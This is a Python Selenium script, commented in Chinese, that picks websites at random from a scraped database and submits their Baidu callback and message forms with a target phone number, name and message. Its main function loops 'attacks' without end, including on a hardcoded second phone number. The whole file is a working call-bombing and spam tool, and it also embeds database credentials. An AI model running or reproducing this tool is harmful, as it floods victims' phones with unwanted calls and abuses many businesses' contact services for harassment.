from json import dumps
from os import environ
from time import sleep
from requests import get
from colorama import Fore
from random import randint
from selenium import webdriver
from config import attack_config
from sqlalchemy.orm import Session
from sqlalchemy import create_engine
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from requests.exceptions import ConnectionError, ReadTimeout
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException, UnexpectedAlertPresentException

ip = 'www.fly****.cn'  # 写入爬取信息的数据库服务器地址, 我已经爬过，你们可以直接找我要数据
environ['NLS_LANG'] = 'SIMPLIFIED CHINESE_CHINA.UTF8'
engine = create_engine(f'oracle+cx_oracle://Zoe:Zoe@{ip}:1521/orcl')


def get_web_infos(id_list):
    """
    获取网站记录
    :param id_list:
    :return:
    """
    id_list = str(id_list).replace('[', '').replace(']', '')
    sql = f'select * from t_info where id_ in ({id_list})'
    session = Session(engine)
    try:
        rows = session.execute(sql).fetchall()
        return rows
    except Exception as e:
        raise e
    finally:
        session.close()


def get_driver(headless=False):
    """
    获取浏览器
    :param headless:  是否显示浏览器界面
    :return:
    """
    chrome_options = webdriver.ChromeOptions()  # 创建chrome参数对象
    if headless:    # 创建chrome无界面对象
        chrome_options.add_argument('--headless')  # 把chrome设置成无界面模式，不论windows还是linux都可以，自动适配对应参数
    chrome_options.add_argument('blink-settings=imagesEnabled=false')  # 不加载图片, 提升速度
    chrome_options.add_argument('--no-sandbox')  # 以root权限运行
    driver = webdriver.Chrome(options=chrome_options)
    return driver


def stop_load(driver, web_info, attack_type):
    """
    等待selenium加载元素, 并停止浏览器加载
    :param driver:
    :param web_info:
    :param attack_type:
    :return:
    """
    wait = WebDriverWait(driver, 10)  # 定义一个wait对象, 10秒超时
    url = web_info['url']
    element_dict = dict()
    try:
        driver.get(url)  # 获取网站内容
    except Exception as e:
        file = e.__traceback__.tb_frame.f_globals['__file__']
        row = e.__traceback__.tb_lineno
        print(Fore.RED, file, row, type(e), str(e), Fore.BLACK)
        return element_dict

    if 'lxb' in attack_type:
        try:
            wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'lxb-cb-input')))  # 避免第二次不能读取
            element_dict['lxb_phone'] = wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'lxb-cb-input')))
            element_dict['lxb_btn'] = wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'lxb-cb-input-btn')))
        except TimeoutException:
            pass
        except UnexpectedAlertPresentException:
            return element_dict
    if 'sq' in attack_type:
        id_dict = {
            'sq_content': 'nb-nodeboard-set-content-js',
            'sq_name': 'nb_nodeboard_set_name',
            'sq_phone': 'nb_nodeboard_set_phone',
            'sq_wechat': 'nb_nodeboard_ext_1',
            'sq_btn': 'nb_nodeboard_send'
        }
        try:
            wait.until(EC.presence_of_element_located((By.ID, 'nb-nodeboard-set-content-js')))
            for k, v in id_dict.items():
                try:
                    element_dict[k] = wait.until(EC.presence_of_element_located((By.ID, v)))
                except TimeoutException:
                    pass
        except TimeoutException:
            pass
        except UnexpectedAlertPresentException:
            return element_dict
    driver.execute_script("window.stop();")
    return element_dict


def write_info(element_dict, attack_dict):
    """
    写入攻击配置信息
    :param element_dict:
    :param attack_dict:
    :return:
    """
    if 'lxb_phone' in element_dict.keys() and element_dict['lxb_phone'].is_displayed():
        element_dict['lxb_phone'].send_keys(attack_dict['phone'])
    if 'sq_content' in element_dict.keys() and element_dict['sq_content'].is_displayed():
        element_dict['sq_content'].send_keys(attack_dict['content'])
    if 'sq_name' in element_dict.keys() and element_dict['sq_name'].is_displayed():
        element_dict['sq_name'].send_keys(attack_dict['name'])
    if 'sq_phone' in element_dict.keys() and element_dict['sq_phone'].is_displayed():
        element_dict['sq_phone'].send_keys(attack_dict['phone'])
    if 'sq_wechat' in element_dict.keys() and element_dict['sq_wechat'].is_displayed():
        element_dict['sq_wechat'].send_keys(attack_dict['wechat'])


def send(driver, web_info, element_dict, attack_type):
    """
    点击发送按钮
    :param driver:
    :param web_info:
    :param element_dict:
    :param attack_type:
    :return:
    """
    if 'sq' in attack_type and 'sq_btn' in element_dict.keys() and element_dict['sq_btn'].is_displayed():
        try:
            element_dict['sq_btn'].click()
        except WebDriverException:  # 按钮被其他元素遮挡, 使用JS点击
            driver.execute_script("$(arguments[0]).click()", element_dict['sq_btn'])
        sleep(5)
        wait_sq_send(driver, web_info)
    elif 'sq' in attack_type:
        print(Fore.RED, '留言发送无效!', Fore.BLACK, f'[{web_info["id_"]}] {web_info["info"]} {web_info["url"]}')
    if 'lxb' in attack_type and 'lxb_btn' in element_dict.keys() and element_dict['lxb_btn'].is_displayed():
        try:
            element_dict['lxb_btn'].click()
        except WebDriverException:  # 按钮被其他元素遮挡, 使用JS点击
            driver.execute_script("$(arguments[0]).click()", element_dict['lxb_btn'])
        sleep(5)
        wait_lxb_send(driver, web_info)
    elif 'lxb' in attack_type:
        print(Fore.RED, '电话发送无效!', Fore.BLACK, f'[{web_info["id_"]}] {web_info["info"]} {web_info["url"]}')


def wait_sq_send(driver, web_info):
    """
    确认商桥是否发送成功
    :param driver:
    :param web_info:
    :return:
    """
    wait = WebDriverWait(driver, 5)  # 定义一个wait对象, 5秒超时
    result = None
    try:
        result = wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'nb-success-title'))).text
    except TimeoutException:
        pass
    driver.execute_script("window.stop();")
    if result:
        print(Fore.GREEN, '留言发送成功!', Fore.BLACK, f'[{web_info["id_"]}] {web_info["info"]} {web_info["url"]} {result}')
        return True
    else:
        print(Fore.RED, '留言发送失败!', Fore.BLACK, f'[{web_info["id_"]}] {web_info["info"]} {web_info["url"]}')
        return False


def wait_lxb_send(driver, web_info):
    """
    确认离线宝是否发送成功, 如果手机被在短时间被重复拨打, 成功率会降低
    :param driver:
    :param web_info:
    :return:
    """
    wait = WebDriverWait(driver, 5)  # 定义一个wait对象, 5秒超时
    result = None
    try:
        result = wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'success-tip-txt'))).text
    except TimeoutException:
        pass
    driver.execute_script("window.stop();")
    if result:
        print(Fore.GREEN, '电话发送成功!', Fore.BLACK, f'[{web_info["id_"]}] {web_info["info"]} {web_info["url"]} {result}')
        return True
    else:
        print(Fore.RED, '电话发送失败!', Fore.BLACK, f'[{web_info["id_"]}] {web_info["info"]} {web_info["url"]}')
        return False


def check_url(url):
    """
    检测网站是否有百度产品
    :param url:
    :return:
    """
    if url.startswith('http://') or url.startswith('https://'):
        pass
    else:
        url = 'http://' + url
    try:
        respone = get(url, timeout=10).text
        status = False
        if 'hm.baidu.com' in respone:
            status = True
        if 'lxbjs.baidu.com' in respone:
            status = True
        return status
    except ConnectionError:
        return False
    except ReadTimeout:
        return False


def attack(driver, attack_dict):
    # 打印攻击配置
    attack_json = dumps(attack_dict, indent=4, separators=(',', ':'), ensure_ascii=False)  # JSON美化输出
    print(Fore.YELLOW, 'attack_config:\n', attack_json)

    # 随机获取攻击的网站ID, 目前有约12万条网站记录, 但并不是每个ID都有
    # 网站信息是通过『lixianbao』中的『main.py』爬取的, 然后存放在我的数据库上
    id_list = [randint(1, 120000) for _ in range(0, attack_dict['attack_num'])]
    try:
        rows = get_web_infos(id_list)  # 获取网站信息
    except Exception as e:
        file = e.__traceback__.tb_frame.f_globals['__file__']
        row = e.__traceback__.tb_lineno
        print(Fore.RED, file, row, type(e), str(e), Fore.BLACK)
        print('获取ID列表失败!')
        return

    for row in rows:
        web_info = {
            'id_': row[0],
            'url': row[3],
            'info': row[1]
        }
        print(Fore.BLUE, '=' * 100)
        print(Fore.GREEN, '正在准备攻击!', Fore.BLACK,
              f'[{web_info["id_"]}] {web_info["info"]} {web_info["url"]}', end='')
        try:
            if check_url(web_info["url"]):  # 不是每个网站都有部署离线宝或商桥代码, 先用requet检测, 提高效率
                print(Fore.GREEN, True)
                element_dict = stop_load(driver, web_info, attack_dict['attack_type'])  # 等待selenium获取元素, 停止浏览器加载
                write_info(element_dict, attack_dict)  # 往文本框元素写入攻击信息
                send(driver, web_info, element_dict, attack_dict['attack_type'])  # 点击发送按钮
            else:
                print(Fore.RED, False)
        except Exception as e:
            file = e.__traceback__.tb_frame.f_globals['__file__']
            row = e.__traceback__.tb_lineno
            print(Fore.RED, file, row, type(e), str(e), Fore.BLACK)
            print('错误ID是:', web_info['id_'])
            # raise e


def main():
    driver = get_driver(False)  # 启用谷歌浏览器
    attack_dict = attack_config
    try:
        while True:
            attack(driver, attack_dict)
            attack_dict['phone'] = '15913101193'  # 配置信息不变, 攻击第二个号码
            attack(driver, attack_dict)
    except Exception as e:
        file = e.__traceback__.tb_frame.f_globals['__file__']
        row = e.__traceback__.tb_lineno
        print(Fore.RED, file, row, type(e), str(e), Fore.BLACK)
    finally:
        driver.close()


if __name__ == '__main__':
    main()
